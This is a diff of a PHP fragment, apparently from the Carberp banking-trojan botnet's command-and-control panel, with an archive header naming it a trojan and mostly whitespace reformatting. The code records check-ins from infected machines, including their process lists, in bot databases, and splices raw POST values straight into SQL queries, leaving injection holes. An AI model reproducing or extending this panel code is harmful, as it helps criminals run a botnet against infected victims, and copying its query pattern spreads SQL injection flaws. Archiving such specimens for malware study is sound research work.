@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(0);
@@ -36,7 +47,8 @@ $return = true;
 
 $bot = $mysqli->query('SELECT id, prefix, uid FROM bf_bots WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
 
-if($bot->prefix != $_POST['prefix'] && $bot->uid != $_POST['uid']){	/*
+if($bot->prefix != $_POST['prefix'] && $bot->uid != $_POST['uid']){
+	/*
 	if(function_exists('geoip_country_code_by_name')){
 		$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
 	}else{
@@ -63,13 +75,18 @@ $mysqli->query('INSERT DELAYED INTO bf_process (prefix, uid, plist) VALUES (\''.
 
 $plist = explode(',', $_POST['plist']);
 
-if(count($plist) > 0){	foreach($plist as $item){		$mysqli->query('INSERT DELAYED INTO bf_process_stats (name, count) VALUES (\''.$item.'\', \'1\') ON duplicate KEY UPDATE count=count+1');
+if(count($plist) > 0){
+	foreach($plist as $item){
+		$mysqli->query('INSERT DELAYED INTO bf_process_stats (name, count) VALUES (\''.$item.'\', \'1\') ON duplicate KEY UPDATE count=count+1');
 	}
-}else{	$return .= ',plist1';
+}else{
+	$return .= ',plist1';
 }
 
-if($return == true){	print_data('OK!', true);
-}else{	print_data('NOT_OK! - ' . $return, true);
+if($return == true){
+	print_data('OK!', true);
+}else{
+	print_data('NOT_OK! - ' . $return, true);
 }
 
 exit;
